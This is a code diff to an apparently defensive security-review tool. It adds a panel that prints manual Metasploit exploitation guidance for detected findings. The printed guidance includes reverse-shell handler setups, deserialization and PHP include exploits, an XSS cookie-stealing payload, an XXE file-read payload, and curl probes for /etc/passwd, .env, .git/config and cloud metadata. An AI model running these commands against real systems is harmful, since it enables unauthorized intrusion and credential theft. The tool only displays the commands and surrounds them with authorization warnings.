@@ -302,6 +302,10 @@ def run_adam(
             "Manual review guidance is included; no exploit automation is ever performed",
         ],
     )
+    # Render Metasploit guidance in Reporter mode as well
+    overview_for_reporter = review_overview(connection, active_target, limit=100)
+    reviews_for_reporter = overview_for_reporter.get("reviews", [])
+    _render_metasploit_guidance(console, reviews_for_reporter)
     spoken_lines = speak_completion(highest_risk, checklist_complete=checklist_success)
     if is_macos():
         console.print("[bold orange3]Daniel voice notification:[/bold orange3]")
@@ -544,6 +548,298 @@ def _render_manual_validation_guidance(console: Console, overview: dict[str, obj
     if top_titles:
         lines.append(f"Top review signals: {', '.join(title for title in top_titles if title)}")
     console.print(Panel("\n".join(f"- {line}" for line in lines), title="Manual Validation Guidance", border_style="orange3"))
+    
+    # Generate Metasploit manual exploitation guidance based on findings
+    _render_metasploit_guidance(console, reviews)
+
+
+def _render_metasploit_guidance(console: Console, reviews: list[dict[str, object]]) -> None:
+    """Generate manual Metasploit exploitation guidance for identified vulnerabilities."""
+    if not reviews:
+        return
+    
+    # Map common vulnerability patterns to Metasploit modules and guidance
+    vuln_mappings = {
+        "sqli": {
+            "module": "auxiliary/scanner/http/sqlmap",
+            "payload": "N/A (auxiliary module)",
+            "commands": [
+                "use auxiliary/scanner/http/sqlmap",
+                "set RHOSTS <TARGET_IP>",
+                "set TARGETURI <VULNERABLE_PATH>",
+                "set THREADS 5",
+                "run",
+            ],
+            "verification": "Check for SQL injection confirmation in module output",
+            "caveats": "May cause database errors; test on non-production systems only",
+        },
+        "xss": {
+            "module": "exploit/multi/browser/firefox_proto_crmfrequest",
+            "payload": "N/A (client-side)",
+            "commands": [
+                "# For reflected XSS, use manual payload crafting",
+                "# Example: <script>alert(document.cookie)</script>",
+                "# Verify with browser developer tools",
+            ],
+            "verification": "Confirm script execution in browser context",
+            "caveats": "XSS exploitation requires social engineering; document for remediation",
+        },
+        "rce": {
+            "module": "exploit/multi/handler",
+            "payload": "linux/x64/meterpreter/reverse_tcp",
+            "commands": [
+                "use exploit/multi/handler",
+                "set PAYLOAD linux/x64/meterpreter/reverse_tcp",
+                "set LHOST <YOUR_IP>",
+                "set LPORT 4444",
+                "set ExitOnSession false",
+                "exploit -j",
+            ],
+            "verification": "Wait for Meterpreter session; verify with 'sessions -l'",
+            "caveats": "CRITICAL: Only test with explicit authorization; ensure scope compliance",
+        },
+        "lfi": {
+            "module": "auxiliary/scanner/http/lfi",
+            "payload": "N/A (auxiliary module)",
+            "commands": [
+                "# Manual LFI testing with curl",
+                "curl -v 'http://<TARGET>/page?file=../../../../etc/passwd'",
+                "# Or use Burp Suite for automated testing",
+            ],
+            "verification": "Confirm file content disclosure in response",
+            "caveats": "LFI can lead to RCE via log poisoning; document findings carefully",
+        },
+        "rfi": {
+            "module": "exploit/unix/webapp/php_include",
+            "payload": "php/meterpreter/reverse_tcp",
+            "commands": [
+                "use exploit/unix/webapp/php_include",
+                "set RHOSTS <TARGET_IP>",
+                "set TARGETURI <VULNERABLE_PATH>",
+                "set PAYLOAD php/meterpreter/reverse_tcp",
+                "set LHOST <YOUR_IP>",
+                "exploit",
+            ],
+            "verification": "Check for Meterpreter session establishment",
+            "caveats": "Requires PHP allow_url_include enabled; high detection risk",
+        },
+        "command_injection": {
+            "module": "exploit/multi/handler",
+            "payload": "cmd/unix/reverse_bash",
+            "commands": [
+                "# Manual command injection testing",
+                "curl 'http://<TARGET>/vuln?cmd=;id'",
+                "# For reverse shell:",
+                "use exploit/multi/handler",
+                "set PAYLOAD cmd/unix/reverse_bash",
+                "set LHOST <YOUR_IP>",
+                "set LPORT 4444",
+                "exploit -j",
+            ],
+            "verification": "Confirm command execution output or shell session",
+            "caveats": "CRITICAL: Command injection is high-risk; test with extreme caution",
+        },
+        "default_credentials": {
+            "module": "auxiliary/scanner/http/tomcat_mgr_login",
+            "payload": "N/A (credential testing)",
+            "commands": [
+                "use auxiliary/scanner/http/tomcat_mgr_login",
+                "set RHOSTS <TARGET_IP>",
+                "set RPORT 8080",
+                "set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt",
+                "run",
+            ],
+            "verification": "Check for successful login in module output",
+            "caveats": "Credential testing may trigger account lockouts; coordinate with target owner",
+        },
+        "open_redirect": {
+            "module": "N/A (manual testing)",
+            "payload": "N/A",
+            "commands": [
+                "# Manual open redirect testing",
+                "curl -v 'http://<TARGET>/redirect?url=https://evil.com'",
+                "# Check for 302 redirect to external domain",
+            ],
+            "verification": "Confirm redirect to attacker-controlled domain",
+            "caveats": "Open redirect alone is low-risk; document for phishing scenarios",
+        },
+        "ssrf": {
+            "module": "auxiliary/scanner/http/ssrf",
+            "payload": "N/A (auxiliary module)",
+            "commands": [
+                "# Manual SSRF testing",
+                "curl 'http://<TARGET>/fetch?url=http://169.254.169.254/latest/meta-data/'",
+                "# Test for internal network access",
+            ],
+            "verification": "Confirm internal service access or metadata disclosure",
+            "caveats": "SSRF can access internal services; document all accessible endpoints",
+        },
+        "xxe": {
+            "module": "auxiliary/scanner/http/xxe",
+            "payload": "N/A (auxiliary module)",
+            "commands": [
+                "# Manual XXE testing with malicious XML",
+                "# Example payload:",
+                '# <?xml version="1.0"?>',
+                '# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
+                "# <foo>&xxe;</foo>",
+            ],
+            "verification": "Confirm file content disclosure in XML response",
+            "caveats": "XXE can lead to SSRF and file disclosure; test carefully",
+        },
+        "deserialization": {
+            "module": "exploit/multi/http/java_deserialization",
+            "payload": "java/meterpreter/reverse_tcp",
+            "commands": [
+                "use exploit/multi/http/java_deserialization",
+                "set RHOSTS <TARGET_IP>",
+                "set TARGETURI <VULNERABLE_PATH>",
+                "set PAYLOAD java/meterpreter/reverse_tcp",
+                "set LHOST <YOUR_IP>",
+                "exploit",
+            ],
+            "verification": "Check for Meterpreter session establishment",
+            "caveats": "Deserialization exploits are highly destructive; test only with authorization",
+        },
+        "weak_ssl": {
+            "module": "auxiliary/scanner/http/ssl_version",
+            "payload": "N/A (auxiliary module)",
+            "commands": [
+                "use auxiliary/scanner/http/ssl_version",
+                "set RHOSTS <TARGET_IP>",
+                "set RPORT 443",
+                "run",
+            ],
+            "verification": "Check for deprecated SSL/TLS versions in output",
+            "caveats": "SSL weaknesses are informational; document for compliance reporting",
+        },
+        "directory_traversal": {
+            "module": "auxiliary/scanner/http/dir_scanner",
+            "payload": "N/A (auxiliary module)",
+            "commands": [
+                "# Manual directory traversal testing",
+                "curl -v 'http://<TARGET>/../../etc/passwd'",
+                "# Use Burp Suite Intruder for automated testing",
+            ],
+            "verification": "Confirm file system access beyond web root",
+            "caveats": "Directory traversal can expose sensitive files; document all findings",
+        },
+        "secrets": {
+            "module": "auxiliary/scanner/http/files",
+            "payload": "N/A (auxiliary module)",
+            "commands": [
+                "# Manual secrets/config file testing",
+                "curl -v 'http://<TARGET>/.env'",
+                "curl -v 'http://<TARGET>/config.local'",
+                "curl -v 'http://<TARGET>/config.properties'",
+                "# Check for sensitive data disclosure",
+            ],
+            "verification": "Confirm sensitive data (API keys, passwords, tokens) in response",
+            "caveats": "Exposed secrets can lead to full system compromise; document all findings",
+        },
+        "config": {
+            "module": "auxiliary/scanner/http/files",
+            "payload": "N/A (auxiliary module)",
+            "commands": [
+                "# Manual config file testing",
+                "curl -v 'http://<TARGET>/.env'",
+                "curl -v 'http://<TARGET>/config.local'",
+                "curl -v 'http://<TARGET>/web.config'",
+                "curl -v 'http://<TARGET>/php.ini'",
+                "# Check for configuration disclosure",
+            ],
+            "verification": "Confirm configuration data (database credentials, API keys) in response",
+            "caveats": "Exposed configuration can reveal system architecture; document all findings",
+        },
+        "svn": {
+            "module": "auxiliary/scanner/http/svn_scanner",
+            "payload": "N/A (auxiliary module)",
+            "commands": [
+                "# Manual SVN metadata testing",
+                "curl -v 'http://<TARGET>/.svn/entries'",
+                "curl -v 'http://<TARGET>/.svn/wc.db'",
+                "# Check for source code disclosure",
+            ],
+            "verification": "Confirm SVN metadata and potential source code disclosure",
+            "caveats": "SVN exposure can reveal source code and credentials; document all findings",
+        },
+        "git": {
+            "module": "auxiliary/scanner/http/git_scanner",
+            "payload": "N/A (auxiliary module)",
+            "commands": [
+                "# Manual Git metadata testing",
+                "curl -v 'http://<TARGET>/.git/HEAD'",
+                "curl -v 'http://<TARGET>/.git/config'",
+                "# Check for source code disclosure",
+            ],
+            "verification": "Confirm Git metadata and potential source code disclosure",
+            "caveats": "Git exposure can reveal source code and credentials; document all findings",
+        },
+        "logs": {
+            "module": "auxiliary/scanner/http/files",
+            "payload": "N/A (auxiliary module)",
+            "commands": [
+                "# Manual log file testing",
+                "curl -v 'http://<TARGET>/access.log'",
+                "curl -v 'http://<TARGET>/error.log'",
+                "curl -v 'http://<TARGET>/development.log'",
+                "# Check for sensitive information in logs",
+            ],
+            "verification": "Confirm log file content and potential sensitive information disclosure",
+            "caveats": "Log files may contain credentials, session tokens, or system information",
+        },
+    }
+    
+    # Extract vulnerability types from reviews
+    identified_vulns = []
+    for review in reviews[:5]:  # Limit to top 5 findings
+        if not isinstance(review, dict):
+            continue
+        title = str(review.get("title") or review.get("finding_key") or "").lower()
+        description = str(review.get("description") or review.get("evidence") or "").lower()
+        combined_text = f"{title} {description}"
+        
+        for vuln_type, guidance in vuln_mappings.items():
+            if vuln_type in combined_text and vuln_type not in [v["type"] for v in identified_vulns]:
+                identified_vulns.append({
+                    "type": vuln_type,
+                    "title": review.get("title") or review.get("finding_key") or vuln_type.upper(),
+                    **guidance,
+                })
+    
+    if not identified_vulns:
+        return
+    
+    # Render Metasploit guidance panel
+    guidance_lines = ["Manual exploitation steps (never auto-run):", ""]
+    
+    for vuln in identified_vulns[:3]:  # Limit to top 3 for readability
+        guidance_lines.append(f"═══ {vuln['title']} ═══")
+        guidance_lines.append(f"Metasploit Module: {vuln['module']}")
+        guidance_lines.append(f"Recommended Payload: {vuln['payload']}")
+        guidance_lines.append("")
+        guidance_lines.append("Commands:")
+        for cmd in vuln["commands"]:
+            guidance_lines.append(f"  {cmd}")
+        guidance_lines.append("")
+        guidance_lines.append(f"Verification: {vuln['verification']}")
+        guidance_lines.append(f"⚠️  Caveats: {vuln['caveats']}")
+        guidance_lines.append("")
+    
+    guidance_lines.append("⚠️  IMPORTANT WARNINGS:")
+    guidance_lines.append("  • NEVER run exploits without explicit written authorization")
+    guidance_lines.append("  • Always verify scope and rules of engagement before testing")
+    guidance_lines.append("  • Use isolated test environments when possible")
+    guidance_lines.append("  • Document all actions for audit trail and reporting")
+    guidance_lines.append("  • Stop immediately if unexpected system behavior occurs")
+    
+    console.print(
+        Panel(
+            "\n".join(guidance_lines),
+            title="Metasploit Manual Exploitation Guidance",
+            border_style="red",
+        )
+    )
 
 
 def _reflection_lines(graph_state: dict[str, object], highest_risk: int, *, checklist_ready: bool) -> list[str]:
